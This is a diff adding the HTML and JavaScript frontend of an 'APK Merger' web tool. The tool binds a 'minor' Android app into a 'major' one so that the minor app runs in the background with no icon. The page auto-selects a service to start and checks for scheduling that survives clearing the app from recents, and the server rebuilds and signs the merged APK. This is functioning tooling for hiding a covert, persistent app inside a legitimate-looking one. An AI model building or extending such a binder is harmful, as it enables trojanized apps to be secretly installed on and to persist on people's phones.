@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>APK Merger</title>
+<style>
+  :root{--bg:#0f1115;--card:#1a1d24;--line:#2a2f3a;--fg:#e8eaed;--mut:#9aa0ac;--accent:#e2231a;--ok:#2ea043;--err:#d64545}
+  *{box-sizing:border-box}
+  body{margin:0;font:15px/1.5 system-ui,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg);display:flex;justify-content:center;padding:32px 16px}
+  .wrap{width:100%;max-width:620px}
+  h1{font-size:22px;margin:0 0 4px}
+  p.sub{color:var(--mut);margin:0 0 24px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:20px;margin-bottom:16px}
+  label{display:block;font-weight:600;margin-bottom:8px}
+  .drop{border:1.5px dashed var(--line);border-radius:10px;padding:18px;text-align:center;color:var(--mut);cursor:pointer;transition:.15s}
+  .drop:hover,.drop.has{border-color:var(--accent);color:var(--fg)}
+  input[type=file]{display:none}
+  select{width:100%;padding:10px;background:var(--bg);color:var(--fg);border:1px solid var(--line);border-radius:8px}
+  button{width:100%;padding:13px;border:0;border-radius:8px;background:var(--accent);color:#fff;font-weight:700;font-size:15px;cursor:pointer;margin-top:4px}
+  button:disabled{opacity:.5;cursor:not-allowed}
+  .status{margin-top:16px;font-size:14px}
+  .ok{color:var(--ok)} .err{color:var(--err)}
+  a.dl{display:inline-block;margin-top:10px;padding:11px 18px;background:var(--ok);color:#fff;text-decoration:none;border-radius:8px;font-weight:700}
+  pre{background:#0b0d11;border:1px solid var(--line);border-radius:8px;padding:12px;overflow:auto;max-height:260px;font-size:12px;color:#aeb4bf;white-space:pre-wrap;margin-top:12px}
+  .hint{font-size:12.5px;color:var(--mut);margin-top:6px}
+  .spin{display:inline-block;width:14px;height:14px;border:2px solid var(--mut);border-top-color:var(--accent);border-radius:50%;animation:s .7s linear infinite;vertical-align:-2px;margin-right:6px}
+  @keyframes s{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>APK Merger</h1>
+  <p class="sub">Combine two apps into one. The <b>major</b> app keeps its icon and screens; the <b>minor</b> app runs in the background with no icon of its own.</p>
+
+  <div class="card">
+    <label>Major app (the one with the UI)</label>
+    <div class="drop" id="dropMajor"><span>Click or drop the major .apk here</span></div>
+    <input type="file" id="major" accept=".apk">
+  </div>
+
+  <div class="card">
+    <label>Minor app (runs in the background)</label>
+    <div class="drop" id="dropMinor"><span>Click or drop the minor .apk here</span></div>
+    <input type="file" id="minor" accept=".apk">
+    <div id="svcBox" style="display:none;margin-top:14px">
+      <label>Background service to auto-start</label>
+      <select id="service"></select>
+      <div class="hint">Picked from the minor app automatically. Leave as-is unless you know which one does the work.</div>
+      <div class="hint" id="schedHint" style="margin-top:8px"></div>
+    </div>
+  </div>
+
+  <button id="go" disabled>Merge into one APK</button>
+  <div class="status" id="status"></div>
+  <pre id="log" style="display:none"></pre>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+function bindDrop(dropId, inputId, onPick){
+  const drop=$(dropId), input=$(inputId);
+  drop.onclick=()=>input.click();
+  ['dragover','dragleave','drop'].forEach(ev=>drop.addEventListener(ev,e=>{e.preventDefault();
+    if(ev==='dragover')drop.classList.add('has'); else drop.classList.remove('has');
+    if(ev==='drop'){input.files=e.dataTransfer.files; input.dispatchEvent(new Event('change'));}}));
+  input.onchange=()=>{ if(input.files[0]){ drop.classList.add('has');
+    drop.querySelector('span').textContent=input.files[0].name; onPick&&onPick(input.files[0]); }
+    checkReady(); };
+}
+function checkReady(){ $('go').disabled = !($('major').files[0] && $('minor').files[0]); }
+
+bindDrop('dropMajor','major');
+bindDrop('dropMinor','minor', async file=>{
+  // ask the server which services the minor app declares
+  const fd=new FormData(); fd.append('minor',file);
+  try{
+    const r=await fetch('/services',{method:'POST',body:fd});
+    const j=await r.json();
+    const sel=$('service'); sel.innerHTML='';
+    if(j.services && j.services.length){
+      j.services.forEach(s=>{const o=document.createElement('option');o.value=s;o.textContent=s;sel.appendChild(o);});
+      $('svcBox').style.display='block';
+    } else { $('svcBox').style.display='none'; }
+    const sh=$('schedHint');
+    if(j.scheduler){
+      sh.innerHTML='Background scheduling detected: <b>'+j.scheduler+'</b> — this is held by the OS, so it keeps running after you clear the app from recents.';
+    } else if(j.services && j.services.length){
+      sh.innerHTML='No WorkManager/AlarmManager/JobScheduler found. If this service just loops in the background, clearing it from recents may stop it on some phones.';
+    } else { sh.innerHTML=''; }
+    if(j.app_class){ sh.innerHTML+='<br>Minor app has a custom Application class (<code>'+j.app_class+'</code>) — if the schedule is registered there, tell me so the hook triggers it.'; }
+  }catch(e){ $('svcBox').style.display='none'; }
+});
+
+$('go').onclick=async()=>{
+  $('go').disabled=true;
+  $('status').innerHTML='<span class="spin"></span>Merging — decompiling, merging, rebuilding and signing. This can take a minute or two…';
+  $('log').style.display='none';
+  const fd=new FormData();
+  fd.append('major',$('major').files[0]);
+  fd.append('minor',$('minor').files[0]);
+  fd.append('service',$('service').value||'');
+  try{
+    const r=await fetch('/merge',{method:'POST',body:fd});
+    const j=await r.json();
+    if(j.ok){
+      $('status').innerHTML='<span class="ok">✓ Done.</span> Auto-starting: <code>'+j.service+'</code>'+
+        '<br><a class="dl" href="'+j.download+'">Download merged.apk</a>';
+    }else{
+      $('status').innerHTML='<span class="err">✗ '+(j.error||'Merge failed')+'</span>';
+    }
+    if(j.log){ $('log').textContent=j.log; $('log').style.display='block'; }
+  }catch(e){
+    $('status').innerHTML='<span class="err">✗ '+e+'</span>';
+  }
+  $('go').disabled=false;
+};
+</script>
+</body>
+</html>
